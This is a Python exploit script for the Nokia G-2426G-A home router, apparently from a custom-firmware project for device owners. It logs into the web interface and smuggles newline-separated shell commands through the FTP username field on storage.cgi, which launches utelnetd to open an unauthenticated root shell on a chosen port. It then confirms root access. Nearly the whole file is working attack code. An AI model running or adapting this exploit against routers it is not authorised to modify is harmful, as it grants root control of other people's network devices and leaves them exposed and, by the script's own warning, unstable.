# -*- coding: utf-8 -*-
"""Nokia G-2426G-A Initial Access Exploit / Shell Opener.

Opens a temporary root Telnet shell on an untouched stock Nokia G-2426G-A
router using authenticated web parameter injection on the FTP storage page.

Requirements:
    pip install requests pycryptodome
"""

import argparse
import base64
import getpass
import re
import socket
import sys
import time

try:
    import requests
    import urllib3
    from Crypto.Cipher import AES, PKCS1_v1_5
    from Crypto.PublicKey import RSA
    from Crypto.Random import get_random_bytes
    from Crypto.Util.Padding import pad
    from urllib.parse import quote

    urllib3.disable_warnings()
except ImportError:
    print("[-] Missing dependencies. Please run:")
    print("    pip install requests pycryptodome")
    sys.exit(1)


def b64u(b):
    return b.replace("+", "-").replace("/", "_").replace("=", ".")


def login(host, user, pswd):
    s = requests.Session()
    s.headers.update(
        {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        }
    )
    print(f"[*] Fetching login tokens from {host}...")
    r = s.get(f"{host}/login.cgi", timeout=15)
    h = r.text
    nonce_m = re.search(r'var nonce = "([^"]+)"', h)
    token_m = re.search(r'var token = ?"([^"]+)"', h)
    pk_m = re.search(r"var pubkey = '([^']+)'", h, re.DOTALL) or re.search(
        r'var pubkey = "([^"]+)"', h, re.DOTALL
    )

    if not (nonce_m and token_m and pk_m):
        print("[-] Failed to extract encryption parameters from login.cgi")
        return None, None

    nonce = nonce_m.group(1)
    token = token_m.group(1)
    pub = pk_m.group(1).replace("\\n", "\n").replace("\\", "")

    postdata = (
        "&username=%s&password=%s&csrf_token=%s&nonce=%s&enckey=%s&enciv=%s"
        % (
            quote(user, safe=""),
            quote(pswd, safe=""),
            token,
            nonce,
            b64u(base64.b64encode(get_random_bytes(16)).decode()),
            b64u(base64.b64encode(get_random_bytes(16)).decode()),
        )
    )
    k = get_random_bytes(16)
    iv = get_random_bytes(16)
    ct = AES.new(k, AES.MODE_CBC, iv).encrypt(pad(postdata.encode(), 16))
    ck = PKCS1_v1_5.new(RSA.import_key(pub)).encrypt(
        (
            base64.b64encode(k).decode() + " " + base64.b64encode(iv).decode()
        ).encode()
    )
    body = (
        "encrypted=1&ct="
        + b64u(base64.b64encode(ct).decode())
        + "&ck="
        + b64u(base64.b64encode(ck).decode())
    )

    r2 = s.post(
        f"{host}/login.cgi",
        data=body,
        allow_redirects=False,
        timeout=15,
        headers={"X-Requested-With": "XMLHttpRequest"},
    )
    ok = r2.status_code == 299 or r2.headers.get("X-SID")
    if not ok:
        print("[-] Login failed. Check your password or user role.")
        return None, None

    print("[+] Web UI authentication successful!")
    rr = s.get(f"{host}/storage.cgi", timeout=15)
    m = re.search(r"name=[\"']csrf_token[\"'][^>]*value=[\"']([^\"']+)", rr.text)
    csrf = m.group(1) if m else ""
    return s, csrf


def trigger_shell(session, host, csrf, port):
    print(f"[*] Injecting temporary root telnet daemon on port {port}...")
    injection = (
        f"ontadmin\n"
        f"touch /tmp/no_telnet_session_idle_time\n"
        f"utelnetd -p {port} -l /bin/sh -d\n"
    )

    data = {
        "enftp": "1",
        "pswd": "InitialShell123!",
        "pswdConfirm": "InitialShell123!",
        "ensftp": "0",
        "enrmsftp": "0",
        "sftpuname": "",
        "sftppswd": "",
        "sftppswdConfirm": "",
        "ensmb": "0",
        "smbwrkgp": "WORKGROUP",
        "smbuname": "",
        "smbpswd": "",
        "smbpswdConfirm": "",
        "enprtr": "0",
        "prtruname": "",
        "prtrpswd": "",
        "prtrpswdConfirm": "",
        "uname": injection,
        "csrf_token": csrf,
        "csrf_val": csrf,
    }

    try:
        session.post(
            f"{host}/storage.cgi?storageget",
            data=data,
            timeout=10,
            allow_redirects=False,
            headers={
                "Referer": f"{host}/storage.cgi",
                "X-Requested-With": "XMLHttpRequest",
            },
        )
    except Exception:
        pass


def verify_connection(ip, port, timeout=60):
    print(f"[*] Waiting for Telnet daemon on {ip}:{port}...")
    t0 = time.time()
    while time.time() - t0 < timeout:
        try:
            sock = socket.create_connection((ip, port), timeout=2)
            sock.sendall(b"id\n")
            time.sleep(0.5)
            out = sock.recv(1024).decode("latin-1", errors="replace")
            sock.close()
            if "uid=0" in out or "root" in out or "/ #" in out or "#" in out:
                print(f"\n[+] SUCCESS! Root shell is active on {ip}:{port}!")
                print("[!] IMPORTANT NOTICE:")
                print(
                    "    This initial shell will cause router services to crash within ~10 minutes"
                )
                print(
                    "    due to cfgmgr XML validation. Do NOT leave the router in this state!"
                )
                print(
                    "    Immediately proceed to step 3 to flash the clean custom firmware:"
                )
                print(
                    f"    python tools/flashing/flash_firmware.py --image <image.bin> --port {port}\n"
                )
                return True
        except Exception:
            pass
        time.sleep(2)
        print(".", end="", flush=True)

    print(f"\n[-] Failed to connect to Telnet on port {port} within {timeout}s.")
    return False


def main():
    p = argparse.ArgumentParser(
        description="Nokia G-2426G-A Initial Root Shell Opener"
    )
    p.add_argument(
        "--ip", default="192.168.1.1", help="Router IP address (default: 192.168.1.1)"
    )
    p.add_argument(
        "--user", default="admin", help="Web UI username (default: admin)"
    )
    p.add_argument(
        "--password",
        help="Web UI password (if omitted, will be prompted securely)",
    )
    p.add_argument(
        "--port",
        type=int,
        default=2360,
        help="Temporary Telnet port to open (default: 2360)",
    )
    args = p.parse_args()

    password = args.password
    if not password:
        password = getpass.getpass(
            f"Enter Web UI password for '{args.user}' at {args.ip}: "
        )

    host = f"http://{args.ip}"
    session, csrf = login(host, args.user, password)
    if not session:
        sys.exit(1)

    trigger_shell(session, host, csrf, args.port)
    if not verify_connection(args.ip, args.port):
        sys.exit(1)


if __name__ == "__main__":
    main()
